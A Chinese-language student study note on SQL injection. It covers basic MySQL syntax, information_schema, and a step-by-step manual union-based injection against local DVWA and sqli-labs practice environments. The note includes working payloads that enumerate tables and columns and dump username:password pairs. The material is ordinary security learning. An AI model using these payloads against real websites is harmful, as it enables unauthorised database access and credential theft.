# 暑期周报2

## SQL 注入

### SQL语句语法：

查询当前数据库服务器所有的数据库:==show databases;==

选中某个数据库：==use 数据库名字==

查询当前数据库所有的表：==show tables;==

查询t1表所有数据：查询关键 select      *所有      from   表名

==select    *  from t1;==

条件查询 id=2   where 条件

==select * from t1 where id=2;==

union 合并查询

2个特性：前面查询的语句  和  后面查询的语句  结果互不干扰

前面查询语句的字段数量   和  后面查询语句的字段数量   要一致

查询id=2   pass=111

==select *from t1 where id=2 union select * from t1 where pass=111;==

order by  排序

==order  by  字段名字  id== 也可以  跟上数字 1 2 3 4 ……

猜解表的列数   知道表有几列

## 数据库服务器

![image-20250803143626267](../AppData/Roaming/Typora/typora-user-images/image-20250803143626267.png)

```
SCHEMATA 表：提供了当前MySQL实例中所有数据库信息， show databases结果取之此表。

	TABLES表：提供了关于数据中表的信息。table_name

	COLUMNS表：提供了表的列信息，详细描述了某张表的所有列以及每个列的信息。column_name
```

![image-20250803144454346](../AppData/Roaming/Typora/typora-user-images/image-20250803144454346.png)

DVWA:http://127.0.0.1/dvwa

sql-labs:http://localhost/sqli-labs

## 尝试手工注入：

index.php?id=1

sql注入

#### 1.判断有无注入点，and 1=1

select * from user where name = $name and 1=1

随便输入的内容    ==    报错      注入

​                             否则   没有注入

#### 2.猜解列名数量  order  by   排序  %20 空格

字段 4个

#### 3.报错  判断回旋点  union  合并查询

index.php?id=99%20union%20select%201,2,3

![image-20250804224125108](../AppData/Roaming/Typora/typora-user-images/image-20250804224125108.png)

#### 4.信息的收集

版本号  version()

![image-20250804224833212](../AppData/Roaming/Typora/typora-user-images/image-20250804224833212.png)

数据库名称 database()

![image-20250804225115431](../AppData/Roaming/Typora/typora-user-images/image-20250804225115431.png)

数据库版本
高版本：5.0  系统库（4个）

低版本：5.0

#### 5.使用对应的sql进行注入

数据库库名：security

.下一级

![image-20250805101523544](../AppData/Roaming/Typora/typora-user-images/image-20250805101523544.png)

![image-20250804231644872](../AppData/Roaming/Typora/typora-user-images/image-20250804231644872.png)

```
尝试手工注入：
		SQL注入： 
		1.判断有无注入点   and 1 = 1； true 
		随便输入内容  ==  报错  注入
		              ==  没有注入
		2.猜解列名数量 order by %20 空格
		字段 4个

		3.报错，判断回显点 union 
		4.信息收集 
		  数据库版本 version()
		  高版本：5.0  
			系统库： infromation 。。。
		  数据库名称：database（）
		  低版本：5.0 
		5.使用对应SQL进行注入  
			数据库库名：security
		. 下一级  
		infromation_schema.tables 查找表名
		table_name
		查询serurity库下面 所有的表名 

		database（）


		= 前后 连到一起
		union select 1,group_concat(table_name),3 from information_schema.tables
		where table_schema=database()

		表： users
		如何查询表里面有那些字段？ 
		user 字符 转行 16进制
		union select 1,group_concat(column_name),3 from information_schema.columns
		where table_name=0x7573657273

		username  password  字段数据  
		select username,password from users
		0x3a  :
		union select 1,2,(select group_concat(username,0x3a,password)from users)
		  
```

